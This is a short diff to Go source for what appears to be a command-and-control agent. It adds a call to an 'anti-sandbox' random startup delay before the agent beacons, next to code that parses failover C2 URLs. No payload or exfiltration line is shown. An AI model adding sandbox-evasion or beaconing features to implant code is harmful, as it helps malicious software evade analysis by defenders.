@@ -130,6 +130,10 @@ func init() {
 	// agent starts with the operator's last-known config before re-registering.
 	loadPersistedNetworkConfig()
 
+	// Anti-sandbox startup delay: per-boot random sleep inside the configured
+	// window before any beacon or task runs. 0/0 (default) disables.
+	applyStartDelay()
+
 	// Parse injected string values ( -X only supports string )
 	// Multi-C2 failover: comma-separated URLs in C2URL
 	parts := strings.Split(C2URL, ",")
